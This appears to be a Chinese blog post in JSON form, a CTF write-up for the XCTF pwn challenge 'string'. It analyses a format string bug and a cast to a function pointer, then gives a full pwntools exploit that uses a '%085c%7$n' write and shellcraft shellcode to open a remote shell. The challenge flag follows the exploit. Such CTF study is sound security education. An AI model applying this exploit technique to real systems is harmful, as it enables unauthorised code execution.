{"title":"攻防世界 string","slug":"攻防世界pwn-string","date":"2020-10-16","updated":"2020-09-10","comments":true,"path":"api/posts/54486.json","excerpt":null,"cover":"https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png","covers":["https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png","https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png","https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png","https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png","https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png","https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png"],"content":"<p>checksec 查看保护机制</p>\n<p><img src=\"https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png\" alt=\"捕获.PNG\"></p>\n<p>注：开启 Full RELRO，无法修改 got 表；开启 Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary 的方法来绕过；开启 NX, 意味着栈中数据没有执行权限；PIE 未开启，基地址不会变化，为 0x400000.</p>\n<h3 id=\"思路分析\"><a href=\"# 思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析 </h3><p>IDA64 查看，在 sub_400CA6() 中发现：v1 被强制转换成函数指针类型。</p>\n<p><img src=\"https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png\" alt=\"17627983-1901e053361f6609.png\"></p>\n<blockquote>\n<p>注：<code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将 v1 强制转换为一个函数指针</p>\n</blockquote>\n<p>其满足条件为 a1==a1[1]，回溯发现，a1 为函数 sub_400D72()函数的参数，即，a1 为 v5.</p>\n<p><img src=\"https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png\" alt=\"17627983-161d0aad17e6e884.png\"></p>\n<p>可看出，v4=v5, 且 *v4=68;v4[1]=85; 也就是说，a1=68,a1[1]=85. 所以我们要修改 a1 值令 a1=85</p>\n<p>按流程分析：<br>在 sub_400A7D()中，满足 s1==“east”，则跳出函数。</p>\n<p>在 sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p>\n<p><img src=\"https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png\" alt=\"17627983-6cdde7e8a076f299.png\"></p>\n<p><code>printf(&amp;format, &amp;format);</code></p>\n<p>通过此处可修改 v4[0]值，现在需要确定 v4[0]地址。在 main()函数中，打印的 secret[0]正是 v5, 即 v4[0]地址。</p>\n<h3 id=\"攻击思路\"><a href=\"# 攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路 </h3><p> 通过格式化字符串漏洞赋值 a1 为 85，使 if 条件成真，执行我们传入的 shellcode 拿到 shell。</p>\n<blockquote>\n<p>函数调用约定：linux_x64 下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9, 当参数为 7 个以上时，前面 6 个与前面一样，但后面的以此从“右向左”放入栈中。</p>\n</blockquote>\n<blockquote>\n<p>利用 pwntools 自带的 shellcodecraft 工具，生成 amd64 架构下的 shellcode，拿到 shell.</p>\n</blockquote>\n<blockquote>\n<p>Pwntools  shellcraft 模块：是 shellcode 的模块，包含一些生成 shellcode 的函数，子模块声明架构（如：shellcode.arm 是 ARm 架构；shellcraft.amd64 是 AMD64 架构；shellcraft.common 是所有架构通用）</p>\n</blockquote>\n<p><code>printf(shellcraft.sh())  #打印出 shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的 shellcode</code></p>\n<p>用 gdb 调试程序，在 printf 下断点，输入 %x 测试，发现输出如图：</p>\n<p><img src=\"https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png\" alt=\"17627983-fe71239050c56166.png\"></p>\n<p>填写 address 时我输入的是 56（0x38），也就是 [rsp+16] 的位置，即格式化字符串的第 7 个参数（printf 的第 8 个参数）</p>\n<blockquote>\n<p>conext.log_level=”debug”  脚本在执行时输出 debug 的信息，可以通过观察这些信息查找哪步出错</p>\n</blockquote>\n<p>补：<br>之前不知道 sh.recv(7),16 是什么意思，现在补充，就是 sendline 自带换行符，所以要把 \\n 过滤掉，7 是因为 v3 就是打印的 6 个书，换行符是第 7 位，16 代表十六进制。</p>\n<p><img src=\"https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png\" alt=\"17627983-56395b2513720994.png\"></p>\n<p>exp：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"> #sh&#x3D;process(&#39;.&#x2F;string&#39;)</span><br><span class=\"line\">sh&#x3D;remote(&#39;111.198.29.45&#39;,36129)</span><br><span class=\"line\">context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\">sh.recvuntil(&#39;secret[0] is&#39;)</span><br><span class=\"line\">v3_addr&#x3D;int(sh.recv(7),16)</span><br><span class=\"line\">sh.recvuntil(&#39;name be:&#39;)</span><br><span class=\"line\">sh.sendline(&#39;zzz&#39;)</span><br><span class=\"line\">sh.recvuntil(&#39;east or up?:&#39;)</span><br><span class=\"line\">sh.sendline(&#39;east&#39;)</span><br><span class=\"line\">sh.recvuntil(&#39;leave(0)?:&#39;)</span><br><span class=\"line\">sh.sendline(&#39;1&#39;)</span><br><span class=\"line\">sh.recvuntil(&#39;\\&#39;Give me an address\\&#39;&#39;)</span><br><span class=\"line\">sh.sendline(str(v3_addr))</span><br><span class=\"line\">sh.recvuntil(&#39;you wish is:&#39;)</span><br><span class=\"line\">payload&#x3D;&#39;%085c&#39;+&#39;%7$n&#39;</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.recvuntil(&#39;I will help you! USE YOU SPELL&#39;)</span><br><span class=\"line\">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch&#x3D;&quot;amd64&quot;))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n<p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>\n","url":"/posts/54486/","min2read":3,"word4post":748,"prev_post":{"title":"漏洞战争学习笔记 1：CVE-2010-2883","url":"/posts/53423/"},"next_post":{"title":"攻防世界 int_overflow","url":"/posts/54610/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"思路分析\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">思路分析 </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"攻击思路\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">攻击思路 </span></a></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}